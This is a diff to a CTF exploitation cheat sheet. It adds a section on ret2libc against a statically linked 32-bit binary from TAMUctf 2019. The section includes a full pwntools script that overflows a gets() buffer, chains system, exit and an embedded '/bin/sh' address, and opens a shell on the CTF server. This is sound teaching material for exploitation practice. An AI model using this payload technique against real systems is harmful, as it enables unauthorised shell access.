@@ -23,6 +23,7 @@
 - [Prime-Only ROP via Goldbach Decomposition (PlaidCTF 2018)](#prime-only-rop-via-goldbach-decomposition-plaidctf-2018)
 - [Imperfect-Gadget Stack Pivot (RITSEC 2018)](#imperfect-gadget-stack-pivot-ritsec-2018)
 - [_fini_array Double-Entry Staged ROP (Insomnihack 2019)](#_fini_array-double-entry-staged-rop-insomnihack-2019)
+- [ret2libc via Statically-Linked libc + Embedded /bin/sh String (TAMUctf 2019)](#ret2libc-via-statically-linked-libc--embedded-binsh-string-tamuctf-2019)
 - [Useful Commands](#useful-commands)
 
 For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).
@@ -676,6 +677,41 @@ Use `add rsp, N; ret` pivots to walk below the current `rsp` so each stage conca
 **Key insight:** `_fini_array` is effectively a re-entrant callback table in static binaries. Two entries plus any "write N bytes to addr" primitive gives you unlimited ROP depth without restarting the process.
 
 **References:** Insomnihack teaser 2019 — onewrite, writeup 12912
+
+---
+
+## ret2libc via Statically-Linked libc + Embedded /bin/sh String (TAMUctf 2019)
+
+**Pattern (pwn5):** Argument is copied into a fixed-size buffer with a 3-character *display* limit — but the underlying `gets()` still reads the full line, yielding a stack overflow 17 bytes past the buffer. The overflow slot is too small for a multi-gadget ROP chain, and no obvious `/bin/sh` appears at predictable addresses. Because the binary is **statically linked**, `system`, `exit`, and an embedded `"/bin/sh"` string from the libc blob all live at fixed addresses — one ret2libc call fits in the overflow slot.
+
+```python
+from pwn import *
+
+# Addresses resolved from the static binary itself:
+#   (gdb) info address system  -> 0x0804ee30
+#   (gdb) info address exit    -> 0x0804e330
+#   0x080bc140: "/bin/sh"              (pulled from rodata / libc blob)
+
+system  = 0x0804ee30
+exit_a  = 0x0804e330
+binsh   = 0x080bc140
+
+# Overflow reaches saved EIP at cyclic offset 17 (cyclic -l on the crash)
+payload  = cyclic(17)
+payload += p32(system)   # ret -> system
+payload += p32(exit_a)   # system's return addr -> exit (avoid SIGSEGV post-shell)
+payload += p32(binsh)    # system's first arg
+
+# Keep the process alive after the shell spawns by piping stdin:
+# (python -c "..."; cat) | nc pwn.tamuctf.com 4325
+io = remote('pwn.tamuctf.com', 4325)
+io.sendline(payload)
+io.interactive()
+```
+
+**Key insight:** Static linking turns every libc symbol into a fixed-offset target inside the binary and drags the entire libc string table (including `"/bin/sh"`) along for free — no leak, no ROPgadget hunting for `/bin/sh`, no dynamic linker games. Whenever `checksec` shows "No PIE" AND `file` reports "statically linked", a 12-byte payload (`system; exit; &/bin/sh`) is usually enough, even in overflow windows too small for a 2-gadget chain. Confirm by `strings -a binary | grep -n /bin/sh` and `nm binary | grep ' T system'`.
+
+**References:** TAMUctf 2019 — pwn5, writeup 13428
 
 ---
 
